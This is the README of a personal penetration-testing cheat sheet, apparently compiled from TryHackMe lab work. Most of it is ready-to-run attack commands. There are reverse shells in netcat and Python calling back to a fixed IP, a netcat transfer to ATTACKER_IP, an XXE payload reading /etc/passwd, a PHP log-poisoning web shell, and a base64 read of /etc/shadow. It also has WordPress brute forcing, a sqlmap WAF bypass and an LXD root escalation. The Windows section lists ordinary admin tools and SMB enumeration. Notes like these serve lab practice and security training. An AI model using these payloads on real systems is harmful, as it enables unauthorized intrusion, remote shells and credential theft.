# HackNotes

This repository contains my personal notes and tricks that I've gathered while working on various machines in the TryHackMe platform. These notes serve as a guide for penetration testing and help me document my progress and findings.

Please note that these notes are a work in progress, and I'll be continuously adding more content as I progress through the challenges and machines.

## Introduction
In this repository, you will find a compilation of various tricks, commands, and techniques that can be useful during penetration testing activities. These notes are intended to assist in the process of hacking and securing systems.

## Tricks
Here are some handy tricks to enhance your pentesting workflow:

---
#### Spawn a fully interactive shell:
```python
# Spawn Python shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Give terminal functions
export TERM=xterm

# Background the shell
Ctrl + Z

# Bring shell back to the foreground 
stty raw -echo; fg
```
#### Read file:
```
xxd -r file.txt 
base64 /etc/shadow | base64 -d
```
`l\s`: Equivalent to `ls`
#### Decompress a gzip file:
```
gzip -d file.gz
```

---
#### Reverse shells
* nc
```nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
```
* python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
* python3
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

---
#### Set appropriate permissions for `id_rsa` file before usage:
```linux
chmod 600 id_rsa
```

---
#### File Transfer on `Netcat`

1. To download a file on the remote shell:
```nc
nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
```
2. To receive the file on the attacker machine:
```nc
nc -l ATTACKER_PORT > [output_file_path]
```
#### Transfer files using `scp`:
```
scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
```
---
### Web
#### Discover hidden directories:
```linux
wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.47.7/island/2100/FUZZ.ticket

feroxbuster -u http://10.10.46.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200
```
#### Discover subdomains with `wfuzz` :
```
wfuzz -c -w /usr/share/dirb/wordlists/subdomains-top1million-5000.txt -u "http://team.thm" -H "Host: FUZZ.team.thm" --hw 977 
```
#### Discover files with `wfuzz` :
```
wfuzz -c -w /usr/share/dirb/wordlists/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php\?page\=FUZZ --hw=0
```
#### Brute force wordpress
```
wpscan --url http://target_on_wp.com/ -e u -P /usr/share/wordlists/rockyou.txt
```
#### Example of XXE 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```
#### php local file inclusion
```
http://10.10.62.183/?view=php://filter/read=convert.base64-encode/resource=dog/../index
curl "http://10.10.62.183/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='command'
```
#### bypass waf sqlmap
```
--tamper=space2comment
```
---
###  Encoding techniques:
- [splitbrain](https://www.splitbrain.org/_static/ook/)
- [hashes](https://hashes.com/en/tools/hash_identifier)
- [md5hashing](https://md5hashing.net/hash)
- [cyberchef](https://gchq.github.io/CyberChef/)
---
### Privilege Escalation:
#### LXD container exploitation:
```
wget archive
lxc image import ./archive --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true # If not working, use FINGERPRINT
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```
#### information gathering
```
cat /proc/version
cat /etc/issue
ps
env
sudo -l
hystory
ifconfig
ip route
uname -a
netstat # -at -l -t -tp -i
find / -writable 2>/dev/null
find / -mtime 10 #find files that were modified in the last 10 days
find . -name flag1.txt
find / -type d -name config #find the directory named config under “/”
find / -type f -perm /4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null #compare executables on this list with GTFOBins
getcap -r / 2>/dev/null
cat /etc/exports #file sharing
nmap --script=vuln <ip>
```
####  Automated Enumeration Tools
* [linPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [linEnum](https://github.com/rebootuser/LinEnum)
* [LES](https://github.com/mzet-/linux-exploit-suggester)
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
* [linux Priv Checker](https://github.com/linted/linuxprivchecker)
---

### Windows
<details><summary> Local User and Group Management </summary>
It is a shell application to manage Windows system administrator applications.

```
lusrmgr.msc
```
</details>
<details> <summary> System Configuration utility </summary>

for diagnose startup issues

```
MSConfig
```
</details>
<details> <summary> Task Manager </summary>

to manage (enable/disable) startup items. 
```
taskmgr
```
</details>
<details> <summary> User Account Control </summary>
helps prevent unauthorized changes (which may be initiated by applications, users, viruses, or other forms of malware) to an operating system

```
UserAccountControlSettings.exe
```
</details>
<details> <summary> Computer Management </summary>
the process of managing, monitoring and optimizing a computer system for performance, availability, security

```
compmgmt
```
</details>
<details> <summary> System Information </summary> 
(gathers information about your computer and displays a comprehensive view of your hardware, system components, and software environment, which you can use to diagnose computer issues.)

```
msinfo32
```
</details>
<details> <summary> Resource Monitor </summary>
displays per-process and aggregate CPU, memory, disk, and network usage information, in addition to providing details about which processes are using individual file handles and modules

```
resmon
```
</details>
<details> <summary> Windows Registry </summary>
central hierarchical database used to store information necessary to configure the system for one or more users, applications, and hardware devices

```
regedit
```
</details>
<details> <summary> SMB discovery </summary>
open SMB shares

```
smbclient -L 10.10.251.241
```

enumeration
```
smbmap -H '10.10.13.234' -u '' -p '' -R 
smbmap -H '10.10.195.72' -u '' -p '' -R -A 'enter.txt' #download file
```

scan with nmap

```
nmap -p 139,445 -Pn -script smb-enum* 10.10.251.241
nmap -p 139,445 -Pn -script smb-vuln* 10.10.251.241
```

connect with smbclient

```
smbclient \\\\10.10.251.241\\nt4wrksv
```

</details>
---

### links
* [database with CVE exploits](https://cvexploits.io/)
* [Linux Kernel CVEs](https://www.linuxkernelcves.com/cves)
* [reverse shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
---
Happy hacking!
